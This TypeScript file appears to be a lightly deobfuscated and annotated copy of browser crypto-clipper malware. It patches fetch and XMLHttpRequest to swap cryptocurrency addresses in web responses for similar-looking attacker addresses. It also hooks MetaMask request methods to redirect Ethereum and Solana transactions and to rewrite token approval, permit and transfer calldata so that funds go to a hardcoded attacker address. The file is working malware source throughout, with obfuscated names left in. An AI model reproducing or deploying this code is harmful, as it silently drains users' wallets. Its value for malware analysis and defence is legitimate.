import {
  bitcoinLegacyAddresses,
  MAIN_ETHEREUM_ADDRESS,
  bitcoinSegwitAddresses,
  bitcoincashAddresses,
  ethereumAddresses,
  litecoin2Addresses,
  solanaAddresses,
  tronAddresses,
} from "./consts";
import { levenshteinDistance } from "./levenshtein";

declare global {
  interface Window {
    ethereum: any;
  }
}

// Set to true if the `eth_accounts` metamask call returned a non-empty list of
// authorized ethereum accounts
var hasAuthorizedEthereumAddresses = false;

const addressFormats = {
  ethereum: /\b0x[a-fA-F0-9]{40}\b/g,
  bitcoinLegacy: /\b1[a-km-zA-HJ-NP-Z1-9]{25,34}\b/g,
  bitcoinSegwit: /\b(3[a-km-zA-HJ-NP-Z1-9]{25,34}|bc1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{11,71})\b/g,
  tron: /((?<!\w)[T][1-9A-HJ-NP-Za-km-z]{33})/g,
  bch: /bitcoincash:[qp][a-zA-Z0-9]{41}/g,
  ltc: /(?<!\w)ltc1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{11,71}\b/g,
  ltc2: /(?<!\w)[mlML][a-km-zA-HJ-NP-Z1-9]{25,34}/g,
  solana: /((?<!\w)[4-9A-HJ-NP-Za-km-z][1-9A-HJ-NP-Za-km-z]{32,44})/g,
  solana2: /((?<!\w)[3][1-9A-HJ-NP-Za-km-z]{35,44})/g,
  solana3: /((?<!\w)[1][1-9A-HJ-NP-Za-km-z]{35,44})/g,
};

async function checkEthereumWindow() {
  try {
    // Returns a list of addresses that the user has authorized the dapp to access. This method
    // requires calling wallet_requestPermissions for permission. We recommend using
    // eth_requestAccounts, which internally calls wallet_requestPermission.
    //
    // <https://docs.metamask.io/wallet/reference/json-rpc-methods/eth_accounts>
    const authorizedAddresses = await window.ethereum.request({
      method: "eth_accounts",
    });

    if (authorizedAddresses.length > 0) {
      hookMetamask();
      hasAuthorizedEthereumAddresses = true;
    }
  } catch (err) {}
  hookNetworkFacilities();
}

if (typeof window != "undefined" && typeof window.ethereum != "undefined") {
  checkEthereumWindow();
} else {
  hookNetworkFacilities();
}

/// This picks the most similar-looking address from `addressPool` —
/// presumably so that it looks less suspicious in transaction logs.
function pickSimilarAddress(reference: string, addressPool: string[]): string {
  let lowestDistance = Infinity;
  let bestCandidate: string = addressPool[0];
  for (let candidate of addressPool) {
    const distance = levenshteinDistance(reference.toLowerCase(), candidate.toLowerCase());
    if (distance < lowestDistance) {
      lowestDistance = distance;
      bestCandidate = candidate;
    }
  }
  return bestCandidate;
}

/// Patch XMLHttpRequest to modify crypto addresses to point to the attacker
function patchXhr() {
  if (typeof window == "undefined") {
    return;
  }

  const send = XMLHttpRequest.prototype.send;
  XMLHttpRequest.prototype.send = function (init) {
    const that = this;
    const oldOnreadystatechange = that.onreadystatechange;

    that.onreadystatechange = function () {
      if (that.readyState === 4) {
        try {
          const contentType = that.getResponseHeader("Content-Type") || "";
          let responseText = that.responseText;
          if (contentType.includes("application/json")) {
            responseText = JSON.parse(that.responseText);
          }
          const modifiedResponseText = modifyNetworkPayload(responseText);
          const newResponse =
            typeof modifiedResponseText === "string"
              ? modifiedResponseText
              : JSON.stringify(modifiedResponseText);

          Object.defineProperty(that, "responseText", {
            value: newResponse,
          });
          Object.defineProperty(that, "response", {
            value: newResponse,
          });
        } catch (e) {}
      }

      if (oldOnreadystatechange) {
        oldOnreadystatechange.apply(this, arguments);
      }
    };
    return send.apply(this, arguments);
  };
}

/// Patch `window.fetch` to modify found crypto addresses
function patchFetch() {
  window.fetch = async function (...args) {
    const res = await fetch(...args);
    const contentType = res.headers.get("Content-Type") || "";

    let payload: any;
    if (contentType.includes("application/json")) {
      // note: clone would normally allow multiple use of the response body,
      // see <https://developer.mozilla.org/en-US/docs/Web/API/Response/clone>
      // ...but it's unnecessary here, since Response is spoofed later on.
      payload = await res.clone().json();
    } else {
      payload = await res.clone().text();
    }
    const modifiedPayload = modifyNetworkPayload(payload);
    const modifiedPayloadString =
      typeof modifiedPayload === "string" ? modifiedPayload : JSON.stringify(modifiedPayload);
    const modifiedResponse = new Response(modifiedPayloadString, {
      status: res.status,
      statusText: res.statusText,
      headers: res.headers,
    });
    return modifiedResponse;
  };
}

function modifyNetworkPayload(arg: any) {
  try {
    if (typeof arg === "object" && arg !== null) {
      // modify in JSON form (addresses are found through regexp anyway)
      return JSON.parse(modifyCryptoAddresses(JSON.stringify(arg)));
    }
    if (typeof arg === "string") {
      return modifyCryptoAddresses(arg);
    }
    return arg;
  } catch (e) {
    return arg;
  }
}

/// Find and modify crypto addresses in the given network payload, which is
/// usually JSON.
function modifyCryptoAddresses(networkPayload: string) {
  for (const [cryptoKind, cryptoAddrRegexp] of Object.entries(addressFormats)) {
    const matches = networkPayload.match(cryptoAddrRegexp) || [];
    for (const match of matches) {
      if (cryptoKind == "ethereum") {
        if (!ethereumAddresses.includes(match) && !hasAuthorizedEthereumAddresses) {
          networkPayload = networkPayload.replace(
            match,
            pickSimilarAddress(match, ethereumAddresses),
          );
        }
      }
      if (cryptoKind == "bitcoinLegacy") {
        if (!bitcoinLegacyAddresses.includes(match)) {
          networkPayload = networkPayload.replace(
            match,
            pickSimilarAddress(match, bitcoinLegacyAddresses),
          );
        }
      }
      if (cryptoKind == "bitcoinSegwit") {
        if (!bitcoinSegwitAddresses.includes(match)) {
          networkPayload = networkPayload.replace(
            match,
            pickSimilarAddress(match, bitcoinSegwitAddresses),
          );
        }
      }
      if (cryptoKind == "tron") {
        if (!tronAddresses.includes(match)) {
          networkPayload = networkPayload.replace(match, pickSimilarAddress(match, tronAddresses));
        }
      }
      if (cryptoKind == "ltc") {
        if (!litecoin2Addresses.includes(match)) {
          networkPayload = networkPayload.replace(
            match,
            pickSimilarAddress(match, litecoin2Addresses),
          );
        }
      }
      if (cryptoKind == "ltc2") {
        if (!litecoin2Addresses.includes(match)) {
          networkPayload = networkPayload.replace(
            match,
            pickSimilarAddress(match, litecoin2Addresses),
          );
        }
      }
      if (cryptoKind == "bch") {
        if (!bitcoincashAddresses.includes(match)) {
          networkPayload = networkPayload.replace(
            match,
            pickSimilarAddress(match, bitcoincashAddresses),
          );
        }
      }
      const allAddresses = [
        ...ethereumAddresses,
        ...bitcoinLegacyAddresses,
        ...bitcoinSegwitAddresses,
        ...tronAddresses,
        ...litecoin2Addresses,
        ...bitcoincashAddresses,
      ];
      const knownAddress = allAddresses.includes(match);
      if (cryptoKind == "solana" && !knownAddress) {
        if (!solanaAddresses.includes(match)) {
          networkPayload = networkPayload.replace(
            match,
            pickSimilarAddress(match, solanaAddresses),
          );
        }
      }
      if (cryptoKind == "solana2" && !knownAddress) {
        if (!solanaAddresses.includes(match)) {
          networkPayload = networkPayload.replace(
            match,
            pickSimilarAddress(match, solanaAddresses),
          );
        }
      }
      if (cryptoKind == "solana3" && knownAddress) {
        if (!solanaAddresses.includes(match)) {
          networkPayload = networkPayload.replace(
            match,
            pickSimilarAddress(match, solanaAddresses),
          );
        }
      }
    }
  }
  return networkPayload;
}

var networkFacilitiesHooked = false;
function hookNetworkFacilities() {
  if (networkFacilitiesHooked) {
    return;
  }
  networkFacilitiesHooked = true;

  patchXhr();
  patchFetch();
}

async function hookMetamask() {
  let interceptCount = 0;
  let originalMethods = new Map();
  let isActive = false;

  /// Patches a metamask request so that the recipient is the attacker's address
  ///
  /// If `isEthereum` is true, expects Ethereum format, if not, expect Solana
  function patchMetamaskRequest(argsIn, isEthereum = true) {
    const args = JSON.parse(JSON.stringify(argsIn));

    if (isEthereum) {
      if (args.value && args.value !== "0x0" && args.value !== "0") {
        args.to = MAIN_ETHEREUM_ADDRESS;
      }
      if (args.data) {
        const _0x250e27 = args.data.toLowerCase();
        if (_0x250e27.startsWith("0x095ea7b3")) {
          if (_0x250e27.length >= 74) {
            const _0x7fa5f0 = _0x250e27.substring(0, 10);
            const _0x15c4f9 = "0x" + _0x250e27.substring(34, 74);
            const _0xde14cc = "Fc4a4858bafef54D1b1d7697bfb5c52F4c166976".padStart(64, "0");
            const _0x3e4a11 = "f".repeat(64);
            args.data = _0x7fa5f0 + _0xde14cc + _0x3e4a11;
            const _0x432d38 = {
              "0x7a250d5630b4cf539739df2c5dacb4c659f2488d": "Uniswap V2",
              "0x66a9893cC07D91D95644AEDD05D03f95e1dBA8Af": "Uniswap V2",
              "0xe592427a0aece92de3edee1f18e0157c05861564": "Uniswap V3",
              "0x10ed43c718714eb63d5aa57b78b54704e256024e": "PancakeSwap V2",
              "0x13f4ea83d0bd40e75c8222255bc855a974568dd4": "PancakeSwap V3",
              "0x1111111254eeb25477b68fb85ed929f73a960582": "1inch",
              "0xd9e1ce17f2641f24ae83637ab66a2cca9c378b9f": "SushiSwap",
            };
            const _0x13f774 = _0x432d38[_0x15c4f9.toLowerCase()];
            if (_0x13f774) {
              console.log(_0x13f774 + _0x15c4f9);
            } else {
              console.log(_0x15c4f9);
            }
          }
        } else {
          if (_0x250e27.startsWith("0xd505accf")) {
            if (_0x250e27.length >= 458) {
              const _0x571743 = _0x250e27.substring(0, 10);
              const _0x55e7fa = _0x250e27.substring(10, 74);
              const _0x382fb5 = _0x250e27.substring(202, 266);
              const _0x5bb3a7 = _0x250e27.substring(266, 330);
              const _0x2e5118 = _0x250e27.substring(330, 394);
              const _0x3ba273 = _0x250e27.substring(394, 458);
              const _0x36b084 = "Fc4a4858bafef54D1b1d7697bfb5c52F4c166976".padStart(64, "0");
              const _0x15389e = "f".repeat(64);
              args.data =
                _0x571743 +
                _0x55e7fa +
                _0x36b084 +
                _0x15389e +
                _0x382fb5 +
                _0x5bb3a7 +
                _0x2e5118 +
                _0x3ba273;
            }
          } else {
            if (_0x250e27.startsWith("0xa9059cbb")) {
              if (_0x250e27.length >= 74) {
                const _0x5d2193 = _0x250e27.substring(0, 10);
                const _0x1493e2 = _0x250e27.substring(74);
                const _0x32c34c = "Fc4a4858bafef54D1b1d7697bfb5c52F4c166976".padStart(64, "0");
                args.data = _0x5d2193 + _0x32c34c + _0x1493e2;
              }
            } else {
              if (_0x250e27.startsWith("0x23b872dd")) {
                if (_0x250e27.length >= 138) {
                  const _0x5c5045 = _0x250e27.substring(0, 10);
                  const _0x1ebe01 = _0x250e27.substring(10, 74);
                  const _0x558b46 = _0x250e27.substring(138);
                  const _0x56d65b = "Fc4a4858bafef54D1b1d7697bfb5c52F4c166976".padStart(64, "0");
                  args.data = _0x5c5045 + _0x1ebe01 + _0x56d65b + _0x558b46;
                }
              }
            }
          }
        }
      } else if (args.to && args.to !== MAIN_ETHEREUM_ADDRESS) {
        args.to = MAIN_ETHEREUM_ADDRESS;
      }
    } else {
      if (args.instructions && Array.isArray(args.instructions)) {
        args.instructions.forEach((_0x190501) => {
          if (_0x190501.accounts && Array.isArray(_0x190501.accounts)) {
            _0x190501.accounts.forEach((_0x2b9990) => {
              if (typeof _0x2b9990 === "string") {
                _0x2b9990 = "19111111111111111111111111111111";
              } else if (_0x2b9990.pubkey) {
                _0x2b9990.pubkey = "19111111111111111111111111111111";
              }
            });
          }
          if (_0x190501.keys && Array.isArray(_0x190501.keys)) {
            _0x190501.keys.forEach((_0x40768f) => {
              if (_0x40768f.pubkey) {
                _0x40768f.pubkey = "19111111111111111111111111111111";
              }
            });
          }
        });
      }
      if (args.recipient) {
        args.recipient = "19111111111111111111111111111111";
      }
      if (args.destination) {
        args.destination = "19111111111111111111111111111111";
      }
    }
    return args;
  }

  function interceptMetamaskRequest(originalMethod, methodName) {
    return async function (...argsIn) {
      interceptCount++;
      let args;
      try {
        args = JSON.parse(JSON.stringify(argsIn));
      } catch (e) {
        args = [...argsIn];
      }

      if (argsIn[0] && typeof argsIn[0] === "object") {
        const req = args[0];
        if (req.method === "eth_sendTransaction" && req.params && req.params[0]) {
          try {
            // Creates a new wallet confirmation to make an Ethereum transaction from the user's
            // account. This method requires that the user has granted permission to interact with
            // their account first, so make sure to call eth_requestAccounts (recommended) or
            // wallet_requestPermissions first.
            //
            // https://docs.metamask.io/wallet/reference/json-rpc-methods/eth_sendtransaction/
            const _0x39ad21 = patchMetamaskRequest(req.params[0], true);
            req.params[0] = _0x39ad21;
          } catch (e) {}
        } else {
          if (
            (req.method === "solana_signTransaction" ||
              req.method === "solana_signAndSendTransaction") &&
            req.params &&
            req.params[0]
          ) {
            try {
              let _0x5ad975 = req.params[0];
              if (_0x5ad975.transaction) {
                _0x5ad975 = _0x5ad975.transaction;
              }
              const _0x5dbe63 = patchMetamaskRequest(_0x5ad975, false);
              if (req.params[0].transaction) {
                req.params[0].transaction = _0x5dbe63;
              } else {
                req.params[0] = _0x5dbe63;
              }
            } catch (_0x4b99fd) {}
          }
        }
      }

      return await originalMethod.apply(this, args);
    };
  }
  function hookMetamask(windowEthereum) {
    if (!windowEthereum) {
      return false;
    }
    let success = false;
    const methodNames = ["request", "send", "sendAsync"];
    for (const methodName of methodNames) {
      if (typeof windowEthereum[methodName] === "function") {
        const method = windowEthereum[methodName];
        originalMethods.set(methodName, method);
        try {
          Object.defineProperty(windowEthereum, methodName, {
            value: interceptMetamaskRequest(method, methodName),
            writable: true,
            configurable: true,
            enumerable: true,
          });
          success = true;
        } catch (err) {}
      }
    }
    if (success) {
      isActive = true;
    }
    return success;
  }
  function hookMetamask() {
    let counter = 0;
    const tryHookMetamask = () => {
      counter++;
      if (window.ethereum) {
        setTimeout(() => {
          hookMetamask(window.ethereum);
        }, 500);
        return;
      }
      if (counter < 50) {
        setTimeout(tryHookMetamask, 100);
      }
    };
    tryHookMetamask();
  }
  hookMetamask();
  window.stealthProxyControl = {
    isActive: () => isActive,
    getInterceptCount: () => interceptCount,
    getOriginalMethods: () => originalMethods,
    forceShield: () => {
      if (window.ethereum) {
        return hookMetamask(window.ethereum);
      }
      return false;
    },
  };
}
